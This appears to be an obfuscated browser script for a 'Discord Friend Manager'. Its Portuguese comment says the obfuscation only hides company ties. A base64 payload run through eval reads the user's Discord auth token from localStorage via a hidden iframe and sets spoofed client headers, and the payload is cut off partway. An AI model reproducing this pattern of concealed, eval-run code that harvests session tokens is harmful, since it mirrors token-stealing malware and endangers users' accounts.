/////////////////////////////////////////////////////
// SIM! O código está ofuscado, mas tem um motivo! //
// Não é para esconder nada, e sim dificultar      //
// a associação a certas empresas.                 //
/////////////////////////////////////////////////////

(function(base64Input){
    const decodedText = new TextDecoder("utf-8").decode(
        Uint8Array.from(atob(base64Input), char => char.charCodeAt(0))
    );
    eval(decodedText);
})("KGFzeW5jICgpID0+IHsKICAgIGlmICghd2luZG93LmxvY2F0aW9uLmhvc3RuYW1lLmluY2x1ZGVzKCJkaXNjb3JkLmNvbSIpIHx8IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJkaXNjb3JkLWZyaWVuZC1tYW5hZ2VyIikpIHJldHVybjsKCiAgICBjb25zdCBnZXRUb2tlbiA9ICgpID0+IHsKICAgICAgICBjb25zdCBpZnJhbWUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpZnJhbWUiKTsKICAgICAgICBpZnJhbWUuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGlmcmFtZSk7CiAgICAgICAgY29uc3QgdG9rZW4gPSBpZnJhbWUuY29udGVudFdpbmRvdy5sb2NhbFN0b3JhZ2UuZ2V0SXRlbSgidG9rZW4iKT8ucmVwbGFjZSgvIi9nLCAiIik7CiAgICAgICAgZG9jdW1lbnQuYm9keS5yZW1vdmVDaGlsZChpZnJhbWUpOwogICAgICAgIHJldHVybiB0b2tlbjsKICAgIH07CgogICAgY29uc3QgZ2V0Q3VycmVudFVzZXJJZCA9ICgpID0+IHsKICAgICAgICBjb25zdCBpZnJhbWUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpZnJhbWUiKTsKICAgICAgICBpZnJhbWUuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGlmcmFtZSk7CiAgICAgICAgY29uc3QgaWQgPSBpZnJhbWUuY29udGVudFdpbmRvdy5sb2NhbFN0b3JhZ2UuZ2V0SXRlbSgidXNlcl9pZF9jYWNoZSIpPy5yZXBsYWNlKC8iL2csICIiKTsKICAgICAgICBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKGlmcmFtZSk7CiAgICAgICAgcmV0dXJuIGlkOwogICAgfTsKCiAgICBjb25zdCB0b2tlbiA9IGdldFRva2VuKCk7CiAgICBjb25zdCB4U3VwZXJQcm9wZXJ0aWVzID0gImV5SnZjeUk2SWxkcGJtUnZkM01pTENKaWNtOTNjMlZ5SWpvaVEyaHliMjFsSWl3aVpHVjJhV05sSWpvaUlpd2ljM2x6ZEdWdFgyeHZZMkZzWlNJNkluQjBMVUpTSWl3aWFHRnpYMk5zYVdWdWRGOXRiMlJ6SWpwbVlXeHpaU3dpWW5KdmQzTmxjbDkxYzJWeVgyRm5aVzUwSWpvaVRXOTZhV3hzWVM4MUxqQWdLRmRwYm1SdmQzTWdUbFFnTVRBdU1Ec2dWMmx1TmpRN0lIZzJOQ2tnUVhCd2JHVlhaV0pMYVhRdk5UTTNMak0ySUNoTFNGUk5UQ3dnYkdsclpTQkhaV05yYnlrZ1EyaHliMjFsTHpFeU1DNHdMakF1TUNCVFlXWmhjbWt2TlRNM0xqTTJJaXdpWW5KdmQzTmxjbDkyWlhKemFXOXVJam9pTVRJd0xqQXVNQzR3SWl3aWIzTmZkbVZ5YzJsdmJpSTZJakV3SWl3aWNtVm1aWEp5WlhJaU9pSWlMQ0p5WldabGNuSnBibWRmWkc5dFlXbHVJam9pSWl3aWNtVnNaV0Z6WlY5amFHRnVibVZzSWpvaWMzUmhZbXhsSWl3aVkyeHBaVzUwWDJKMWFXeGtYMjUxYldKbGNpSTZPVGs1T1RrNUxDSmpiR2xsYm5SZlpYWmxiblJmYzI5MWNtTmxJanB1ZFd4c2ZRPT0iOwoKICAgIGNvbnN0IGRlbGF5cyA9IHsgZmFzdDogMTAwLCBub3JtYWw6IDUwMCwgc2xvdzogMTAwMCB9OwogICAgbGV0IHJlcXVlc3REZWxheSA9IGRlbGF5cy5ub3JtYWw7CiAgICBsZXQgcmVxdWVzdFNwZWVkID0gIm5vcm1hbCI7CgogICAgY29uc3Qgbm90aWZpY2F0aW9uUXVldWUgPSBbXTsKICAgIGxldCBhY3RpdmVOb3RpZmljYXRpb25zID0gMDsKICAgIGxldCBpc01hbmFnZXJPcGVuID0gZmFsc2U7CiAgICBsZXQgaXNBbmltYXRpbmcgPSBmYWxzZTsKICAgIGxldCBpc0RyYWdnaW5nID0gZmFsc2U7CiAgICBsZXQgb2Zmc2V0WCwgb2Zmc2V0WTsKCiAgICBjb25zdCBzdHlsZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInN0eWxlIik7CiAgICBzdHlsZS50ZXh0Q29udGVudCA9IGAKICAgICAgICBAa2V5ZnJhbWVzIHNsaWRlSW5SaWdodCB7IGZyb20geyB0cmFuc2Zvcm06IHRyYW5zbGF0ZVgoNDAwcHgpOyBvcGFjaXR5OiAwOyB9IHRvIHsgdHJhbnNmb3JtOiB0cmFuc2xhdGVYKDApOyBvcGFjaXR5OiAxOyB9IH0KICAgICAgICBAa2V5ZnJhbWVzIHNsaWRlT3V0UmlnaHQgeyBmcm9tIHsgdHJhbnNmb3JtOiB0cmFuc2xhdGVYKDApOyBvcGFjaXR5OiAxOyB9IHRvIHsgdHJhbnNmb3JtOiB0cmFuc2xhdGVYKDQwMHB4KTsgb3BhY2l0eTogMDsgfSB9CiAgICAgICAgQGtleWZyYW1lcyBmYWRlSW4geyBmcm9tIHsgb3BhY2l0eTogMDsgdHJhbnNmb3JtOiBzY2FsZSgwLjk1KTsgfSB0byB7IG9wYWNpdHk6IDE7IHRyYW5zZm9ybTogc2NhbGUoMSk7IH0gfQogICAgICAgIEBrZXlmcmFtZXMgZmFkZU91dCB7IGZyb20geyBvcGFjaXR5OiAxOyB0cmFuc2Zvcm06IHNjYWxlKDEpOyB9IHRvIHsgb3BhY2l0eTogMDsgdHJhbnNmb3JtOiBzY2FsZSgwLjk1KTsgfSB9CiAgICAgICAgQGtleWZyYW1lcyBtb2RhbEZhZGVJbiB7IGZyb20geyBvcGFjaXR5OiAwOyB0cmFuc2Zvcm06IHNjYWxlKDAuOTUpOyB9IHRvIHsgb3BhY2l0eTogMTsgdHJhbnNmb3JtOiBzY2FsZSgxKTsgfSB9CiAgICAgICAgQGtleWZyYW1lcyBzaGltbWVyIHsgMCUgeyBiYWNrZ3JvdW5kLXBvc2l0aW9uOiAtMjAwJSAwOyB9IDEwMCUgeyBiYWNrZ3JvdW5kLXBvc2l0aW9uOiAyMDAlIDA7IH0gfQogICAgICAgIEBrZXlmcmFtZXMgZG90cyB7IDAlLCAyMCUgeyBjb250ZW50OiAnLic7IH0gNDAlIHsgY29udGVudDogJy4uJzsgfSA2MCUsIDEwMCUgeyBjb250ZW50OiAnLi4uJzsgfSB9CgogICAgICAgICNkaXNjb3JkLWZyaWVuZC1tYW5hZ2VyLCAjZGlzY29yZC1mcmllbmQtbWFuYWdlciAqLCAjZGlzY29yZC1mcmllbmQtbWFuYWdlciAqOjpiZWZvcmUsICNkaXNjb3JkLWZyaWVuZC1tYW5hZ2VyICo6OmFmdGVyLAogICAgICAgIC5kZm0tbW9kYWwsIC5kZm0tbW9kYWwgKiwgLmRmbS1zZXR0aW5ncy1tb2RhbCwgLmRmbS1zZXR0aW5ncy1tb2RhbCAqLCAjZGZtLW5vdGlmaWNhdGlvbi1jb250YWluZXIsICNkZm0tbm90aWZpY2F0aW9uLWNvbnRhaW5lciAqIHsKICAgICAgICAgICAgYm94LXNpemluZzogYm9yZGVyLWJveCAhaW1wb3J0YW50OwogICAgICAgICAgICBmb250LWZhbWlseTogJ2dnIHNhbnMnLCAnTm90byBTYW5zJywgJ0hlbHZldGljYSBOZXVlJywgSGVsdmV0aWNhLCBBcmlhbCwgc2Fucy1zZXJpZiAhaW1wb3J0YW50OwogICAgICAgIH0KCiAgICAgICAgI2Rpc2NvcmQtZnJpZW5kLW1hbmFnZXIgewogICAgICAgICAgICBwb3NpdGlvbjogZml4ZWQgIWltcG9ydGFudDsgZGlzcGxheTogbm9uZSAhaW1wb3J0YW50OyB3aWR0aDogNzAwcHggIWltcG9ydGFudDsgbWF4LXdpZHRoOiBjYWxjKDEwMHZ3IC0gNDBweCkgIWltcG9ydGFudDsKICAgICAgICAgICAgaGVpZ2h0OiA2MDBweCAhaW1wb3J0YW50OyBtYXgtaGVpZ2h0OiBjYWxjKDEwMHZoIC0gNDBweCkgIWltcG9ydGFudDsKICAgICAgICAgICAgYmFja2dyb3VuZDogbGluZWFyLWdyYWRpZW50KDE0NWRlZywgIzBmMGYwZiAwJSwgIzFhMWExYSAxMDAlKSAhaW1wb3J0YW50OyBib3JkZXItcmFkaXVzOiAxMnB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIHotaW5kZXg6IDk5OTk5OSAhaW1wb3J0YW50OyBmbGV4LWRpcmVjdGlvbjogY29sdW1uICFpbXBvcnRhbnQ7IG92ZXJmbG93OiBoaWRkZW4gIWltcG9ydGFudDsKICAgICAgICAgICAgYm9yZGVyOiAxcHggc29saWQgcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjEpICFpbXBvcnRhbnQ7CiAgICAgICAgfQogICAgICAgICNkaXNjb3JkLWZyaWVuZC1tYW5hZ2VyLnZpc2libGUgeyBkaXNwbGF5OiBmbGV4ICFpbXBvcnRhbnQ7IGFuaW1hdGlvbjogZmFkZUluIDAuMjVzIGVhc2UgZm9yd2FyZHMgIWltcG9ydGFudDsgfQogICAgICAgICNkaXNjb3JkLWZyaWVuZC1tYW5hZ2VyLmNsb3NpbmcgeyBkaXNwbGF5OiBmbGV4ICFpbXBvcnRhbnQ7IGFuaW1hdGlvbjogZmFkZU91dCAwLjI1cyBlYXNlIGZvcndhcmRzICFpbXBvcnRhbnQ7IH0KCiAgICAgICAgLmRmbS1oZWFkZXIgewogICAgICAgICAgICBiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoMTM1ZGVnLCAjMWExYTFhIDAlLCAjMTQxNDE0IDEwMCUpICFpbXBvcnRhbnQ7IHBhZGRpbmc6IDE2cHggMjBweCAhaW1wb3J0YW50OwogICAgICAgICAgICBib3JkZXItYm90dG9tOiAxcHggc29saWQgcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjA4KSAhaW1wb3J0YW50OyBkaXNwbGF5OiBmbGV4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGp1c3RpZnktY29udGVudDogY2VudGVyICFpbXBvcnRhbnQ7IGFsaWduLWl0ZW1zOiBjZW50ZXIgIWltcG9ydGFudDsgY3Vyc29yOiBtb3ZlICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIHVzZXItc2VsZWN0OiBub25lICFpbXBvcnRhbnQ7IHBvc2l0aW9uOiByZWxhdGl2ZSAhaW1wb3J0YW50OyBmbGV4LXNocmluazogMCAhaW1wb3J0YW50OyBtaW4taGVpZ2h0OiA1NnB4ICFpbXBvcnRhbnQ7CiAgICAgICAgfQogICAgICAgIC5kZm0taGVhZGVyOjpiZWZvcmUgewogICAgICAgICAgICBjb250ZW50OiAnJyAhaW1wb3J0YW50OyBwb3NpdGlvbjogYWJzb2x1dGUgIWltcG9ydGFudDsgdG9wOiAwICFpbXBvcnRhbnQ7IGxlZnQ6IDAgIWltcG9ydGFudDsKICAgICAgICAgICAgd2lkdGg6IDEwMCUgIWltcG9ydGFudDsgaGVpZ2h0OiAxMDAlICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCg5MGRlZywgdHJhbnNwYXJlbnQsIHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4wMyksIHRyYW5zcGFyZW50KSAhaW1wb3J0YW50OwogICAgICAgICAgICBiYWNrZ3JvdW5kLXNpemU6IDIwMCUgMTAwJSAhaW1wb3J0YW50OyBhbmltYXRpb246IHNoaW1tZXIgM3MgZWFzZS1pbi1vdXQgaW5maW5pdGUgIWltcG9ydGFudDsgcG9pbnRlci1ldmVudHM6IG5vbmUgIWltcG9ydGFudDsKICAgICAgICB9CiAgICAgICAgLmRmbS10aXRsZSB7IGNvbG9yOiAjZmZmZmZmICFpbXBvcnRhbnQ7IGZvbnQtc2l6ZTogMTZweCAhaW1wb3J0YW50OyBmb250LXdlaWdodDogNzAwICFpbXBvcnRhbnQ7IGxldHRlci1zcGFjaW5nOiAtMC4zcHggIWltcG9ydGFudDsgdGV4dC1hbGlnbjogY2VudGVyICFpbXBvcnRhbnQ7IG1hcmdpbjogMCAhaW1wb3J0YW50OyBwYWRkaW5nOiAwICFpbXBvcnRhbnQ7IH0KICAgICAgICAuZGZtLWNvbnRyb2xzIHsgcG9zaXRpb246IGFic29sdXRlICFpbXBvcnRhbnQ7IHJpZ2h0OiAxNnB4ICFpbXBvcnRhbnQ7IHRvcDogNTAlICFpbXBvcnRhbnQ7IHRyYW5zZm9ybTogdHJhbnNsYXRlWSgtNTAlKSAhaW1wb3J0YW50OyBkaXNwbGF5OiBmbGV4ICFpbXBvcnRhbnQ7IGdhcDogOHB4ICFpbXBvcnRhbnQ7IH0KCiAgICAgICAgLmRmbS1idG4taWNvbiB7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4wNikgIWltcG9ydGFudDsgYm9yZGVyOiAxcHggc29saWQgcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjEpICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGNvbG9yOiAjYjBiMGIwICFpbXBvcnRhbnQ7IGN1cnNvcjogcG9pbnRlciAhaW1wb3J0YW50OyB3aWR0aDogMzJweCAhaW1wb3J0YW50OyBoZWlnaHQ6IDMycHggIWltcG9ydGFudDsKICAgICAgICAgICAgbWluLXdpZHRoOiAzMnB4ICFpbXBvcnRhbnQ7IG1pbi1oZWlnaHQ6IDMycHggIWltcG9ydGFudDsgYm9yZGVyLXJhZGl1czogNnB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIHRyYW5zaXRpb246IGFsbCAwLjE1cyBlYXNlICFpbXBvcnRhbnQ7IGZvbnQtc2l6ZTogMTZweCAhaW1wb3J0YW50OyBkaXNwbGF5OiBmbGV4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGFsaWduLWl0ZW1zOiBjZW50ZXIgIWltcG9ydGFudDsganVzdGlmeS1jb250ZW50OiBjZW50ZXIgIWltcG9ydGFudDsgcGFkZGluZzogMCAhaW1wb3J0YW50OyBtYXJnaW46IDAgIWltcG9ydGFudDsKICAgICAgICB9CiAgICAgICAgLmRmbS1idG4taWNvbjpob3ZlciB7IGJhY2tncm91bmQ6IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4xKSAhaW1wb3J0YW50OyBjb2xvcjogI2ZmZmZmZiAhaW1wb3J0YW50OyBib3JkZXItY29sb3I6IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4xNSkgIWltcG9ydGFudDsgfQogICAgICAgIC5kZm0tYnRuLWljb246YWN0aXZlIHsgdHJhbnNmb3JtOiBzY2FsZSgwLjkyKSAhaW1wb3J0YW50OyBvcGFjaXR5OiAwLjggIWltcG9ydGFudDsgfQoKICAgICAgICAuZGZtLXRhYnMgeyBkaXNwbGF5OiBmbGV4ICFpbXBvcnRhbnQ7IGJhY2tncm91bmQ6ICMxNDE0MTQgIWltcG9ydGFudDsgYm9yZGVyLWJvdHRvbTogMXB4IHNvbGlkIHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4wOCkgIWltcG9ydGFudDsgZmxleC1zaHJpbms6IDAgIWltcG9ydGFudDsgcGFkZGluZzogMCAhaW1wb3J0YW50OyBtYXJnaW46IDAgIWltcG9ydGFudDsgfQogICAgICAgIC5kZm0tdGFiIHsKICAgICAgICAgICAgZmxleDogMSAhaW1wb3J0YW50OyBwYWRkaW5nOiAxNHB4IDIwcHggIWltcG9ydGFudDsgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQgIWltcG9ydGFudDsgYm9yZGVyOiBub25lICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGNvbG9yOiAjODg4ODg4ICFpbXBvcnRhbnQ7IGZvbnQtc2l6ZTogMTRweCAhaW1wb3J0YW50OyBmb250LXdlaWdodDogNjAwICFpbXBvcnRhbnQ7IGN1cnNvcjogcG9pbnRlciAhaW1wb3J0YW50OwogICAgICAgICAgICB0cmFuc2l0aW9uOiBhbGwgMC4ycyBlYXNlICFpbXBvcnRhbnQ7IHRleHQtYWxpZ246IGNlbnRlciAhaW1wb3J0YW50OyBwb3NpdGlvbjogcmVsYXRpdmUgIWltcG9ydGFudDsgbWFyZ2luOiAwICFpbXBvcnRhbnQ7CiAgICAgICAgfQogICAgICAgIC5kZm0tdGFiOjphZnRlciB7CiAgICAgICAgICAgIGNvbnRlbnQ6ICcnICFpbXBvcnRhbnQ7IHBvc2l0aW9uOiBhYnNvbHV0ZSAhaW1wb3J0YW50OyBib3R0b206IDAgIWltcG9ydGFudDsgbGVmdDogNTAlICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIHdpZHRoOiAwICFpbXBvcnRhbnQ7IGhlaWdodDogMnB4ICFpbXBvcnRhbnQ7IGJhY2tncm91bmQ6ICM1ODY1ZjIgIWltcG9ydGFudDsKICAgICAgICAgICAgdHJhbnNpdGlvbjogYWxsIDAuMnMgZWFzZSAhaW1wb3J0YW50OyB0cmFuc2Zvcm06IHRyYW5zbGF0ZVgoLTUwJSkgIWltcG9ydGFudDsKICAgICAgICB9CiAgICAgICAgLmRmbS10YWI6aG92ZXIgeyBjb2xvcjogI2NjY2NjYyAhaW1wb3J0YW50OyBiYWNrZ3JvdW5kOiByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMDMpICFpbXBvcnRhbnQ7IH0KICAgICAgICAuZGZtLXRhYi5hY3RpdmUgeyBjb2xvcjogIzU4NjVmMiAhaW1wb3J0YW50OyBiYWNrZ3JvdW5kOiByZ2JhKDg4LCAxMDEsIDI0MiwgMC4wOCkgIWltcG9ydGFudDsgfQogICAgICAgIC5kZm0tdGFiLmFjdGl2ZTo6YWZ0ZXIgeyB3aWR0aDogMTAwJSAhaW1wb3J0YW50OyBsZWZ0OiAwICFpbXBvcnRhbnQ7IHRyYW5zZm9ybTogdHJhbnNsYXRlWCgwKSAhaW1wb3J0YW50OyB9CgogICAgICAgIC5kZm0tY29udGVudCB7CiAgICAgICAgICAgIGZsZXg6IDEgIWltcG9ydGFudDsgb3ZlcmZsb3cteTogYXV0byAhaW1wb3J0YW50OyBvdmVyZmxvdy14OiBoaWRkZW4gIWltcG9ydGFudDsgYmFja2dyb3VuZDogIzBmMGYwZiAhaW1wb3J0YW50OwogICAgICAgICAgICBzY3JvbGxiYXItd2lkdGg6IHRoaW4gIWltcG9ydGFudDsgc2Nyb2xsYmFyLWNvbG9yOiByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMTUpIHRyYW5zcGFyZW50ICFpbXBvcnRhbnQ7CiAgICAgICAgfQogICAgICAgIC5kZm0tY29udGVudDo6LXdlYmtpdC1zY3JvbGxiYXIgeyB3aWR0aDogOHB4ICFpbXBvcnRhbnQ7IH0KICAgICAgICAuZGZtLWNvbnRlbnQ6Oi13ZWJraXQtc2Nyb2xsYmFyLXRyYWNrIHsgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQgIWltcG9ydGFudDsgfQogICAgICAgIC5kZm0tY29udGVudDo6LXdlYmtpdC1zY3JvbGxiYXItdGh1bWIgeyBiYWNrZ3JvdW5kOiByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMTUpICFpbXBvcnRhbnQ7IGJvcmRlci1yYWRpdXM6IDRweCAhaW1wb3J0YW50OyB9CiAgICAgICAgLmRmbS1jb250ZW50Ojotd2Via2l0LXNjcm9sbGJhci10aHVtYjpob3ZlciB7IGJhY2tncm91bmQ6IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4yNSkgIWltcG9ydGFudDsgfQoKICAgICAgICAuZGZtLXRhYi1jb250ZW50IHsgZGlzcGxheTogbm9uZSAhaW1wb3J0YW50OyBwYWRkaW5nOiAyMHB4ICFpbXBvcnRhbnQ7IH0KICAgICAgICAuZGZtLXRhYi1jb250ZW50LmFjdGl2ZSB7IGRpc3BsYXk6IGJsb2NrICFpbXBvcnRhbnQ7IH0KCiAgICAgICAgLmRmbS1zZWFyY2gtY29udGFpbmVyIHsgbWFyZ2luLWJvdHRvbTogMTZweCAhaW1wb3J0YW50OyB9CiAgICAgICAgLmRmbS1zZWFyY2ggewogICAgICAgICAgICB3aWR0aDogMTAwJSAhaW1wb3J0YW50OyBwYWRkaW5nOiAxMnB4IDE2cHggIWltcG9ydGFudDsgYmFja2dyb3VuZDogcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjA2KSAhaW1wb3J0YW50OwogICAgICAgICAgICBib3JkZXI6IDFweCBzb2xpZCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMSkgIWltcG9ydGFudDsgYm9yZGVyLXJhZGl1czogOHB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGNvbG9yOiAjZmZmZmZmICFpbXBvcnRhbnQ7IGZvbnQtc2l6ZTogMTRweCAhaW1wb3J0YW50OyB0cmFuc2l0aW9uOiBhbGwgMC4ycyBlYXNlICFpbXBvcnRhbnQ7IG91dGxpbmU6IG5vbmUgIWltcG9ydGFudDsKICAgICAgICB9CiAgICAgICAgLmRmbS1zZWFyY2g6OnBsYWNlaG9sZGVyIHsgY29sb3I6ICM2NjY2NjYgIWltcG9ydGFudDsgfQogICAgICAgIC5kZm0tc2VhcmNoOmZvY3VzIHsgYm9yZGVyLWNvbG9yOiAjNTg2NWYyICFpbXBvcnRhbnQ7IGJhY2tncm91bmQ6IHJnYmEoODgsIDEwMSwgMjQyLCAwLjEpICFpbXBvcnRhbnQ7IH0KCiAgICAgICAgLmRmbS1hY3Rpb25zIHsgZGlzcGxheTogZmxleCAhaW1wb3J0YW50OyBnYXA6IDEwcHggIWltcG9ydGFudDsgbWFyZ2luLWJvdHRvbTogMTZweCAhaW1wb3J0YW50OyBmbGV4LXdyYXA6IHdyYXAgIWltcG9ydGFudDsgfQogICAgICAgIC5kZm0tYWN0aW9ucyAuZGZtLWJ0biB7IGZsZXg6IDEgIWltcG9ydGFudDsgbWluLXdpZHRoOiAxNDBweCAhaW1wb3J0YW50OyB9CgogICAgICAgIC5kZm0tYnRuIHsKICAgICAgICAgICAgYmFja2dyb3VuZDogbGluZWFyLWdyYWRpZW50KDEzNWRlZywgIzU4NjVmMiAwJSwgIzQ3NTJjNCAxMDAlKSAhaW1wb3J0YW50OyBjb2xvcjogI2ZmZmZmZiAhaW1wb3J0YW50OwogICAgICAgICAgICBib3JkZXI6IG5vbmUgIWltcG9ydGFudDsgcGFkZGluZzogMTJweCAyMHB4ICFpbXBvcnRhbnQ7IGJvcmRlci1yYWRpdXM6IDhweCAhaW1wb3J0YW50OwogICAgICAgICAgICBmb250LXNpemU6IDE0cHggIWltcG9ydGFudDsgZm9udC13ZWlnaHQ6IDYwMCAhaW1wb3J0YW50OyBjdXJzb3I6IHBvaW50ZXIgIWltcG9ydGFudDsKICAgICAgICAgICAgdHJhbnNpdGlvbjogYWxsIDAuMTVzIGVhc2UgIWltcG9ydGFudDsgdGV4dC1hbGlnbjogY2VudGVyICFpbXBvcnRhbnQ7IHdoaXRlLXNwYWNlOiBub3dyYXAgIWltcG9ydGFudDsgbWFyZ2luOiAwICFpbXBvcnRhbnQ7CiAgICAgICAgfQogICAgICAgIC5kZm0tYnRuOmhvdmVyIHsgZmlsdGVyOiBicmlnaHRuZXNzKDEuMSkgIWltcG9ydGFudDsgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKC0xcHgpICFpbXBvcnRhbnQ7IH0KICAgICAgICAuZGZtLWJ0bjphY3RpdmUgeyB0cmFuc2Zvcm06IHRyYW5zbGF0ZVkoMCkgIWltcG9ydGFudDsgfQogICAgICAgIC5kZm0tYnRuLnNlY29uZGFyeSB7IGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCgxMzVkZWcsICMzYTNhM2EgMCUsICMyYTJhMmEgMTAwJSkgIWltcG9ydGFudDsgYm9yZGVyOiAxcHggc29saWQgcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjEpICFpbXBvcnRhbnQ7IH0KICAgICAgICAuZGZtLWJ0bi5zZWNvbmRhcnk6aG92ZXIgeyBiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoMTM1ZGVnLCAjNDQ0NDQ0IDAlLCAjMzMzMzMzIDEwMCUpICFpbXBvcnRhbnQ7IH0KICAgICAgICAuZGZtLWJ0bi5kYW5nZXIgeyBiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoMTM1ZGVnLCAjZWQ0MjQ1IDAlLCAjYzAzNTM3IDEwMCUpICFpbXBvcnRhbnQ7IH0KICAgICAgICAuZGZtLWJ0bi5kYW5nZXI6aG92ZXIgeyBmaWx0ZXI6IGJyaWdodG5lc3MoMS4xKSAhaW1wb3J0YW50OyB9CiAgICAgICAgLmRmbS1idG4ud2FybmluZyB7IGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCgxMzVkZWcsICNmYWE2MWEgMCUsICNkNjhhMTUgMTAwJSkgIWltcG9ydGFudDsgfQogICAgICAgIC5kZm0tYnRuLndhcm5pbmc6aG92ZXIgeyBmaWx0ZXI6IGJyaWdodG5lc3MoMS4xKSAhaW1wb3J0YW50OyB9CiAgICAgICAgLmRmbS1idG46ZGlzYWJsZWQgeyBvcGFjaXR5OiAwLjUgIWltcG9ydGFudDsgY3Vyc29yOiBub3QtYWxsb3dlZCAhaW1wb3J0YW50OyB0cmFuc2Zvcm06IG5vbmUgIWltcG9ydGFudDsgcG9pbnRlci1ldmVudHM6IG5vbmUgIWltcG9ydGFudDsgfQoKICAgICAgICAuZGZtLWZyaWVuZCwgLmRmbS1zZXJ2ZXIgewogICAgICAgICAgICBiYWNrZ3JvdW5kOiByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMDQpICFpbXBvcnRhbnQ7IHBhZGRpbmc6IDEycHggMTZweCAhaW1wb3J0YW50OyBib3JkZXItcmFkaXVzOiA4cHggIWltcG9ydGFudDsKICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogOHB4ICFpbXBvcnRhbnQ7IGRpc3BsYXk6IGZsZXggIWltcG9ydGFudDsgYWxpZ24taXRlbXM6IGNlbnRlciAhaW1wb3J0YW50OyBnYXA6IDEycHggIWltcG9ydGFudDsKICAgICAgICAgICAgdHJhbnNpdGlvbjogYWxsIDAuMTVzIGVhc2UgIWltcG9ydGFudDsgYm9yZGVyOiAxcHggc29saWQgcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjA2KSAhaW1wb3J0YW50OwogICAgICAgIH0KICAgICAgICAuZGZtLWZyaWVuZDpob3ZlciwgLmRmbS1zZXJ2ZXI6aG92ZXIgeyBiYWNrZ3JvdW5kOiByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMDgpICFpbXBvcnRhbnQ7IGJvcmRlci1jb2xvcjogcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjEpICFpbXBvcnRhbnQ7IH0KICAgICAgICAuZGZtLWZyaWVuZC5zZWxlY3RlZCwgLmRmbS1zZXJ2ZXIuc2VsZWN0ZWQgeyBiYWNrZ3JvdW5kOiByZ2JhKDg4LCAxMDEsIDI0MiwgMC4xNSkgIWltcG9ydGFudDsgYm9yZGVyLWNvbG9yOiByZ2JhKDg4LCAxMDEsIDI0MiwgMC40KSAhaW1wb3J0YW50OyB9CgogICAgICAgIC5kZm0tY2hlY2tib3ggeyB3aWR0aDogMThweCAhaW1wb3J0YW50OyBoZWlnaHQ6IDE4cHggIWltcG9ydGFudDsgbWluLXdpZHRoOiAxOHB4ICFpbXBvcnRhbnQ7IG1pbi1oZWlnaHQ6IDE4cHggIWltcG9ydGFudDsgY3Vyc29yOiBwb2ludGVyICFpbXBvcnRhbnQ7IGFjY2VudC1jb2xvcjogIzU4NjVmMiAhaW1wb3J0YW50OyBmbGV4LXNocmluazogMCAhaW1wb3J0YW50OyBtYXJnaW46IDAgIWltcG9ydGFudDsgfQoKICAgICAgICAuZGZtLWF2YXRhciwgLmRmbS1zZXJ2ZXItaWNvbiB7CiAgICAgICAgICAgIHdpZHRoOiA0MHB4ICFpbXBvcnRhbnQ7IGhlaWdodDogNDBweCAhaW1wb3J0YW50OyBtaW4td2lkdGg6IDQwcHggIWltcG9ydGFudDsgbWluLWhlaWdodDogNDBweCAhaW1wb3J0YW50OwogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA1MCUgIWltcG9ydGFudDsgZmxleC1zaHJpbms6IDAgIWltcG9ydGFudDsgYm9yZGVyOiAycHggc29saWQgcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjEpICFpbXBvcnRhbnQ7IG9iamVjdC1maXQ6IGNvdmVyICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLWluZm8geyBmbGV4OiAxICFpbXBvcnRhbnQ7IG1pbi13aWR0aDogMCAhaW1wb3J0YW50OyBkaXNwbGF5OiBmbGV4ICFpbXBvcnRhbnQ7IGZsZXgtZGlyZWN0aW9uOiBjb2x1bW4gIWltcG9ydGFudDsganVzdGlmeS1jb250ZW50OiBjZW50ZXIgIWltcG9ydGFudDsgfQogICAgICAgIC5kZm0tbmFtZSB7IGNvbG9yOiAjZmZmZmZmICFpbXBvcnRhbn